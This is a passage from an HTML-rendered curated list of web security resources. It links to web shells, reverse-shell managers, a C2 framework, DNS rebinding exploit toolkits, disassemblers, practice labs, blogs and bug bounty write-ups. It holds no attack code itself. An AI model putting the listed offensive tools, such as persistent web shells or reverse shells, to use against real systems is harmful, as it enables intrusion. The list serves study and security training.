data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYS93ZWV2ZWx5Mw==\">Weevely</span> - Weaponized web shell by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYQ==\">@epinna</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvV2Vic2hlbGwtU25pcGVy\">Webshell-Sniper</span> - Manage your website via terminal by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmc=\">@WangYihang</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvUmV2ZXJzZS1TaGVsbC1NYW5hZ2Vy\">Reverse-Shell-Manager</span> - Reverse Shell Manager via Terminal <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmc=\">@WangYihang</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzU5Njc0Lmh0bWw=\">Linux 后门整理合集（脉搏推荐）</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzL2F1dGhvci9hcm15emVyMA==\">armyzer0</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2x1a2VjaGlsZHMvcmV2ZXJzZS1zaGVsbA==\">reverse-shell</span> - Reverse Shell as a Service by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2x1a2VjaGlsZHM=\">@lukechilds</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25pbDB4NDIvcGhwc3Bsb2l0\">PhpSploit</span> - Full-featured C2 framework which silently persists on webserver via evil PHP oneliner by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25pbDB4NDI=\">@nil0x42</span>.</li>\n</ul>\n<p><a name=\"tools-disassembler\"></a></p>\n<h3 id=\"disassembler\"><a class=\"anchor\" href=\"#disassembler\">#</a> Disassembler</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BsYXNtYS1kaXNhc3NlbWJsZXIvcGxhc21h\">plasma</span> - Plasma is an interactive disassembler for x86/ARM/MIPS by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BsYXNtYS1kaXNhc3NlbWJsZXI=\">@plasma-disassembler</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JhZGFyZS9yYWRhcmUy\">radare2</span> - Unix-like reverse engineering framework and commandline tools by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JhZGFyZQ==\">@radare</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2h0ZXNvL2lhaXRv\">Iaitō</span> - Qt and C++ GUI for radare2 reverse engineering framework by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2h0ZXNv\">@hteso</span>.</li>\n</ul>\n<p><a name=\"tools-decompiler\"></a></p>\n<h3 id=\"decompiler\"><a class=\"anchor\" href=\"#decompiler\">#</a> Decompiler</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iZW5mLm9yZy9vdGhlci9jZnIv\">CFR</span> - Another java decompiler by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9MZWVBdEJlbmY=\">@LeeAtBenf</span>.</li>\n</ul>\n<p><a name=\"tools-dns-rebinding\"></a></p>\n<h3 id=\"dns-rebinding-2\"><a class=\"anchor\" href=\"#dns-rebinding-2\">#</a> DNS Rebinding</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyYW5ub25kb3JzZXkvZG5zLXJlYmluZC10b29sa2l0\">DNS Rebind Toolkit</span> - DNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN) by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyYW5ub25kb3JzZXk=\">@brannondorsey</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL213cmxhYnMvZHJlZg==\">dref</span> - DNS Rebinding Exploitation Framework. Dref does the heavy-lifting for DNS rebinding by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL213cmxhYnM=\">@mwrlabs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25jY2dyb3VwL3Npbmd1bGFyaXR5\">Singularity of Origin</span> - It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25jY2dyb3Vw\">@nccgroup</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyYW5ub25kb3JzZXkvd2hvbm93\">Whonow DNS Server</span> - A malicious DNS server for executing DNS Rebinding attacks on the fly by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyYW5ub25kb3JzZXk=\">@brannondorsey</span></li>\n</ul>\n<p><a name=\"tools-others\"></a></p>\n<h3 id=\"others-2\"><a class=\"anchor\" href=\"#others-2\">#</a> Others</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLnNrdWxsc2VjdXJpdHkub3JnL2luZGV4LnBocD90aXRsZT1EbnNsb2dnZXI=\">Dnslogger</span> - DNS Logger by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODY=\">@iagox86</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2djaHEvQ3liZXJDaGVm\">CyberChef</span> - The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis - by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2djaHE=\">@GCHQ</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2IxN3pyL250bG1fY2hhbGxlbmdlcg==\">ntlm_challenger</span> - Parse NTLM over HTTP challenge messages by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2IxN3py\">@b17zr</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rhdmlzby9jZWZkZWJ1Zw==\">cefdebug</span> - Minimal code to connect to a CEF debugger by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rhdmlzbw==\">@taviso</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rhdmlzby9jdGZ0b29s\">ctftool</span> - Interactive CTF Exploration Tool by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rhdmlzbw==\">@taviso</span>.</li>\n</ul>\n<h2 id=\"social-engineering-database\"><a class=\"anchor\" href=\"#social-engineering-database\">#</a> Social Engineering Database</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXZlaWJlZW5wd25lZC5jb20v\">haveibeenpwned</span> - Check if you have an account that has been compromised in a data breach by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJveWh1bnQuY29tLw==\">Troy Hunt</span>.</li>\n</ul>\n<h2 id=\"blogs\"><a class=\"anchor\" href=\"#blogs\">#</a> Blogs</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span> - Taiwan's talented web penetrator.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">leavesongs</span> - China's talented web penetrator.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2FsYmlub3dheC5za2VsZXRvbnNjcmliZS5uZXQv\">James Kettle</span> - Head of Research at <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">PortSwigger Web Security</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYnJva2VuYnJvd3Nlci5jb20v\">Broken Browser</span> - Fun with Browser Vulnerabilities.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kYXRhcmlmdC5ibG9nc3BvdC50dy8=\">Scrutiny</span> - Internet Security through Web Browsers by Dhiraj Mishra.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idWVyLmhhdXMv\">BRETT BUERHAUS</span> - Vulnerability disclosures and rambles on application security.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubjB0cjAwdC5jb20v\">n0tr00t</span> - ~# n0tr00t Security Team.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLw==\">OpnSec</span> - Open Mind Security!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb3JleHhhci5jbi8=\">LoRexxar</span> - 带着对技术的敬畏之心成长，不安于一隅...</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJpcHN0ZWNoLmNvbS90YWdzL3NlY3VyaXR5Lw==\">RIPS Technologies</span> - Write-ups for PHP vulnerabilities.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuMGRheWxhYnMuY29tLw==\">0Day Labs</span> - Awesome bug-bounty and challenges writeups.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vc2FuZGFtYWxpdGguY29tLw==\">Blog of Osanda</span> - Security Researching and Reverse Engineering.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9raW5neC5tZS8=\">What is Security?</span> - Focus on Penetration Testing / Frontend Security / JavaScript Magic / APT Offense &amp; Defense / Java Security.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sbXhzcGFjZS5jb20v\">l1nk3r's blog</span> - Web security.</li>\n</ul>\n<h2 id=\"twitter-users\"><a class=\"anchor\" href=\"#twitter-users\">#</a> Twitter Users</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9IYWNrd2l0aEdpdGh1Yg==\">@HackwithGitHub</span> - Initiative to showcase open source hacking tools for hackers and pentesters</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9maWxlZGVzY3JpcHRvcg==\">@filedescriptor</span> - Active penetrator often tweets and writes useful articles</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9jdXJlNTNiZXJsaW4=\">@cure53berlin</span> - <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJlNTMuZGUv\">Cure53</span> is a German cybersecurity firm.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Yc3NQYXlsb2Fkcw==\">@XssPayloads</span> - The wonderland of JavaScript unexpected usages, and more.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9raW51Z2F3YW1hc2F0bw==\">@kinugawamasato</span> - Japanese web penetrator.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oM3hzdHJlYW0v\">@h3xstream</span> - Security Researcher, interested in web security, crypto, pentest, static analysis but most of all, samy is my hero.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nYXJldGhoZXllcw==\">@garethheyes</span> - English web penetrator.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oYXNlZ2F3YXlvc3VrZQ==\">@hasegawayosuke</span> - Japanese javascript security researcher.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaGhuams=\">@shhnjk</span> - Web and Browsers Security Researcher.</li>\n</ul>\n<h2 id=\"practices\"><a class=\"anchor\" href=\"#practices\">#</a> Practices</h2>\n<p><a name=\"practices-application\"></a></p>\n<h3 id=\"application\"><a class=\"anchor\" href=\"#application\">#</a> Application</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JraW1taW5pY2gvanVpY2Utc2hvcA==\">OWASP Juice Shop</span> - Probably the most modern and sophisticated insecure web application - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JraW1taW5pY2g=\">@bkimminich</span> and the <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9vd2FzcF9qdWljZXNob3A=\">@owasp_juiceshop</span> team.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZVNreVRlY2hub2xvZ3kvQmFkTGlicmFyeQ==\">BadLibrary</span> - Vulnerable web application for training - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZVNreVRlY2hub2xvZ3k=\">@SecureSkyTechnology</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2hhY2t4b3IubmV0Lw==\">Hackxor</span> - Realistic web application hacking game - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hbGJpbm93YXg=\">@albinowax</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3NlbGludXhnYW1lLm9yZy8=\">SELinux Game</span> - Learn SELinux by doing. Solve Puzzles, show skillz - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zZWxpbnV4Z2FtZQ==\">@selinuxgame</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5\">Portswigger Web Security Academy</span> - Free trainings and labs - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">PortSwigger</span>.</li>\n</ul>\n<p><a name=\"practices-aws\"></a></p>\n<h3 id=\"aws-2\"><a class=\"anchor\" href=\"#aws-2\">#</a> AWS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2ZsYXdzLmNsb3VkLw==\">FLAWS</span> - Amazon AWS CTF challenge - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS8weGRhYmJhZDAw\">@0xdabbad00</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JoaW5vU2VjdXJpdHlMYWJzL2Nsb3VkZ29hdA==\">CloudGoat</span> - Rhino Security Labs' &quot;Vulnerable by Design&quot; AWS infrastructure setup tool  - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JoaW5vU2VjdXJpdHlMYWJz\">@RhinoSecurityLabs</span>.</li>\n</ul>\n<p><a name=\"practices-xss\"></a></p>\n<h3 id=\"xss-2\"><a class=\"anchor\" href=\"#xss-2\">#</a> XSS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=\">XSS game</span> - Google XSS Challenge - Written by Google.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3Byb21wdC5tbC8=\">prompt(1) to win</span> - Complex 16-Level XSS Challenge held in summer 2014 (+4 Hidden Levels) - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1Mw==\">@cure53</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hbGYubnUvYWxlcnQx\">alert(1) to win</span> - Series of XSS challenges - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zdGVpa2U=\">@steike</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3hzcy1xdWl6LmludDIxaC5qcC8=\">XSS Challenges</span> - Series of XSS challenges - Written by yamagata21.</li>\n</ul>\n<p><a name=\"practices-modsecurity\"></a></p>\n<h3 id=\"modsecurity-owasp-modsecurity-core-rule-set\"><a class=\"anchor\" href=\"#modsecurity-owasp-modsecurity-core-rule-set\">#</a> ModSecurity / OWASP ModSecurity Core Rule Set</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0bmVhLmNvbS9jbXMvYXBhY2hlLXR1dG9yaWFscy8=\">ModSecurity / OWASP ModSecurity Core Rule Set</span> - Series of tutorials to install, configure and tune ModSecurity and the Core Rule Set - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9DaHJGb2xpbmk=\">@ChrFolini</span>.</li>\n</ul>\n<h2 id=\"community\"><a class=\"anchor\" href=\"#community\">#</a> Community</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL3dlYnNlY3VyaXR5Lw==\">Reddit</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy90YWdnZWQvc2VjdXJpdHk=\">Stack Overflow</span></li>\n</ul>\n<h2 id=\"miscellaneous\"><a class=\"anchor\" href=\"#miscellaneous\">#</a> Miscellaneous</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RqYWRtaW4vYXdlc29tZS1idWctYm91bnR5\">awesome-bug-bounty</span> - Comprehensive curated list of available Bug Bounty &amp; Disclosure Programs and write-ups by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RqYWRtaW4=\">@djadmin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25nYWxvbmdjL2J1Zy1ib3VudHktcmVmZXJlbmNl\">bug-bounty-reference</span> - List of bug bounty write-up that is categorized by the bug nature by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25nYWxvbmdj\">@ngalongc</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvYnVnaHVudGVydW5pdmVyc2l0eS9iZWhpbmQtdGhlLXNjZW5lcy9wcmVzZW50YXRpb25zL2dvb2dsZS12cnAtYW5kLXVuaWNvcm5z\">Google VRP and Unicorns</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL2RhbmllbC1zdGVsdGVyLWdsaWVzZS0xNzBhNzBhMi8=\">Daniel Stelter-Gliese</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RldmNvLnJlL2Jsb2cvMjAxNC8wNi8xOS9jbGllbnQtaXAtZGV0ZWN0aW9uLw==\">如何正確的取得使用者 IP ？</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2RldmNvLnJlL2Jsb2cvYXV0aG9yL2FsbGVub3du\">Allen Own</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1h5bnRheC8xMDAwcGhw\">1000php</span> - 1000 个 PHP 代码审计案例 (2016.7 以前乌云公开漏洞) by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1h5bnRheA==\">@Xyntax</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3B3bmRpenpsZS5ibG9nc3BvdC5qcC8yMDE0LzAyL2JydXRlLWZvcmNpbmcteW91ci1mYWNlYm9vay1lbWFpbC1hbmQuaHRtbA==\">Brute Forcing Your Facebook Email and Phone Number</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3B3bmRpenpsZS5ibG9nc3BvdC5qcC8=\">PwnDizzle</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2kuaW1ndXIuY29tL01yOXB2cTkuanBn\">Pentest + Exploit dev Cheatsheet wallpaper</span> - Penetration Testing and Exploit Dev CheatSheet.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jb3ZlcnQuaW8vdGhlLWRlZmluaXRpdmUtc2VjdXJpdHktZGF0YXNjaWVuY2UtYW5kLW1hY2hpbmVsZWFybmluZy1ndWlkZS8=\">The Definitive Security Data Science and Machine Learning Guide</span> - Written by JASON TROS.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3gwcnovRVFHUlA=\">EQGRP</span> - Decrypted content of eqgrp-auction-file.tar.xz by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3gwcno=\">@x0rz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NoQUxrZVIvbm90ZXM=\">notes</span> - Some public notes by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NoQUxrZVI=\">@ChALkeR</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWJlbmdpbmVlcmluZy5jb20vZ2l0aHVicy1idWctYm91bnR5LXdvcmtmbG93Lw==\">A glimpse into GitHub's Bug Bounty workflow</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dyZWdvc2U=\">@gregose</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5tb3R0b2luLmNvbS8xMDY2ODcuaHRtbA==\">暗网系列之：利用 Dark Web Report + EyeWitness+ TorGhost +Docker，自动化获取暗网站点的信息</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5tb3R0b2luLmNvbS91c2VyL3lpbmcv\">鹰小编</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVsZmVyY2VudGVyLm9yZy9DeWJlclBsYXlib29r\">Cybersecurity Campaign Playbook</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVsZmVyY2VudGVyLm9yZy8=\">Belfer Center for Science and International Affairs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JtdXNzZXIwMS9JbmZvc2VjX1JlZmVyZW5jZQ==\">Infosec_Reference</span> - Information Security Reference That Doesn't Suck by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JtdXNzZXIwMQ==\">@rmusser01</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2lvdHNjYW5uZXIuYnVsbGd1YXJkLmNvbS8=\">Internet of Things Scanner</span> - Check if your internet-connected devices at home are public on Shodan by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYnVsbGd1YXJkLmNvbS8=\">BullGuard</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMVZwUlQ4ZEZ5VGFGcFFhOWpoZWh0bUdhQzdUcVFuaU1TWWJVZGxITjZWclkvZWRpdD91c3A9c2hhcmluZw==\">The Bug Hunters Methodology v2.1</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9qaGFkZGl4\">@jhaddix</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGVzdHNpdGVoYWNraW5nLy03LTVrLUdvb2dsZS1zZXJ2aWNlcy1taXgtdXA=\">$7.5k Google services mix-up</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGVzdHNpdGVoYWNraW5nLw==\">Ezequiel Pereira</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmRldGVjdGlmeS5jb20vMjAxOC8wMS8xMi9ob3ctaS1leHBsb2l0ZWQtYWNtZS10bHMtc25pLTAxLWlzc3VpbmctbGV0cy1lbmNyeXB0LXNzbC1jZXJ0cy1mb3ItYW55LWRvbWFpbi11c2luZy1zaGFyZWQtaG9zdGluZy8=\">How I exploited ACME TLS-SNI-01 issuing Let's Encrypt SSL-certs for any domain using shared hosting</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9mcmFuc3Jvc2Vu\">@fransrosen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly92b2lkc2VjLmNvbS92cG4tbGVhay8=\">TL:DR: VPN leaks users’ IPs via WebRTC. I’ve tested seventy VPN providers and 16 of them leaks users’ IPs via WebRTC (23%)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly92b2lkc2VjLmNvbS8=\">voidsec</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3B0aXYuY29tL2Jsb2cvZXNjYXBlLWFuZC1ldmFzaW9uLWVncmVzc2luZy1yZXN0cmljdGVkLW5ldHdvcmtz\">Escape and Evasion Egressing Restricted Networks</span> - Written by <a href=\"info@optiv.com\">Chris Patten, Tom Steele</a>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B1bXBveC9iZS1jYXJlZnVsLXdoYXQteW91LWNvcHktaW52aXNpYmx5LWluc2VydGluZy11c2VybmFtZXMtaW50by10ZXh0LXdpdGgtemVyby13aWR0aC1jaGFyYWN0ZXJzLTE4YjRlNmYxN2I2Ng==\">Be careful what you copy: Invisibly inserting usernames into text with Zero-Width Characters</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B1bXBveA==\">@umpox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2lncHduLmlvL2Jsb2cvMjAxOC80LzE0L2RvbWF0by1mdXp6ZXJzLWdlbmVyYXRpb24tZW5naW5lLWludGVybmFscw==\">Domato Fuzzer's Generation Engine Internals</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2lncHduLmlvLw==\">sigpwn</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXZvbmlkZS5jb20vc2lkZS1jaGFubmVsLWF0dGFja2luZy1icm93c2Vycy10aHJvdWdoLWNzczMtZmVhdHVyZXMv\">CSS Is So Overpowered It Can Deanonymize Facebook Users</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXZvbmlkZS5jb20v\">Ruslan Habalov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbnJhZ3VwYXRoeS9pbnRyb2R1Y3Rpb24tdG8td2ViLWFwcGxpY2F0aW9uLXNlY3VyaXR5LWJsYWNraG9vZGllLXVzLTIwMTg=\">Introduction to Web Application Security</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9pdHNDMHJnMQ==\">@itsC0rg1</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9qbWtlYWRz\">@jmkeads</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9tYXRpcg==\">@matir</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2ZpbmRpbmctcmVhbC1pcHMtb2Ytb3JpZ2luLXNlcnZlcnMtYmVoaW5kLWNsb3VkZmxhcmUtb3ItdG9yLw==\">Finding The Real Origin IPs Hiding Behind CloudFlare or TOR</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2F1dGhvci9wYXVsLWRhbm5ld2l0ei8=\">Paul Dannewitz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXYudG8vYW50b2dhcmFuZC93aHktZmFjZWJvb2tzLWFwaS1zdGFydHMtd2l0aC1hLWZvci1sb29wLTFlb2I=\">Why Facebook's api starts with a for loop</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9BbnRvR2FyYW5k\">@AntoGarand</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmF2YXRhby5jb20vSG93LUktY291bGQtc3RlYWwteW91ci1waG90b3MtZnJvbS1Hb29nbGUv\">How I could have stolen your photos from Google - my first 3 bug bounty writeups</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nZXJnb3R1cmNzYW55aQ==\">@gergoturcsanyi</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly8wZGF5LndvcmsvYW4tZXhhbXBsZS13aHktbmF0LWlzLW5vdC1zZWN1cml0eS8=\">An example why NAT is NOT security</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9AMGRheXdvcms=\">@0daywork</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNodm9taXQubmV0L3dlYi1hcHBsaWNhdGlvbi1wZW5ldHJhdGlvbi10ZXN0aW5nLW5vdGVzLw==\">WEB APPLICATION PENETRATION TESTING NOTES</span> - Written by <span 